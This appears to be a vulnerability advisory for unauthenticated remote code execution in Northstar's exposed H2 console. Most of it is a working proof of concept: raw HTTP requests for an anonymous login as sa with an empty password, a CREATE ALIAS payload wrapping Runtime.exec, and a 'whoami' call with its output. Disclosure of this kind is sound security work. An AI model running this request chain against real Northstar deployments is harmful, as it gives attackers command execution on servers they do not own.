# Northstar H2 Console Unauthenticated RCE

## Summary

Northstar (dromara/northstar, quantitative trading platform) enables the H2 Console (`spring.h2.console.enabled: true`) but its auth interceptor only covers `/northstar/**`, so `/h2-console` is exposed with **no authentication** and the embedded H2 DB uses default `sa` / **empty password**. Any network-reachable attacker can run arbitrary system commands via `CREATE ALIAS` (pre-auth RCE).

**Affected**: Northstar <= 9.1.1
**Condition**: `/h2-console` reachable (enabled in dev & prod profiles; server binds all interfaces)

## Reproduction

Env: `java -jar northstar-9.1.1.jar --spring.profiles.active=dev --server.port=9081`

**1. Get session (anonymous)**

```
GET /h2-console/ HTTP/1.1
Host: 127.0.0.1:9081
```

→ 200, page contains `location.href = 'login.jsp?jsessionid={JSID}'`

![image-20260825145947589](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260825145947589.2a5trtfsdc.png)

**2. Login (sa / empty password)**

```
POST /h2-console/login.do?jsessionid={JSID} HTTP/1.1
Host: 127.0.0.1:9081
Content-Type: application/x-www-form-urlencoded

language=en&setting=Generic+H2+(Embedded)&name=Generic+H2+(Embedded)&driver=org.h2.Driver&url=jdbc:h2:file:./data/storage&user=sa&password=
```

→ 200 frameset (login OK)

![image-20260825150319502](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260825150319502.7p4ca8vbow.webp)

**3. Create command-exec function**

```
POST /h2-console/query.do?jsessionid={JSID} HTTP/1.1
Host: 127.0.0.1:9081
Content-Type: application/x-www-form-urlencoded

sql=CREATE ALIAS IF NOT EXISTS SHELLEXEC AS 'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(new String[]{"cmd","/c",cmd}).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : ""; }';
```

→ `Update count: 0` (OK)

![image-20260825151031550](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260825151031550.6f1f3xdmnn.webp)

**4. RCE**

```
POST /h2-console/query.do?jsessionid={JSID} HTTP/1.1
Host: 127.0.0.1:9081
Content-Type: application/x-www-form-urlencoded

sql=CALL SHELLEXEC('whoami');
```

→ `desktop-nchj5ql\administrator`

![image-20260825150357365](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260825150357365.86udytx9pz.webp)

## Impact

Pre-auth RCE — arbitrary command execution as the Northstar process user (Administrator in test). No credentials required at any step.
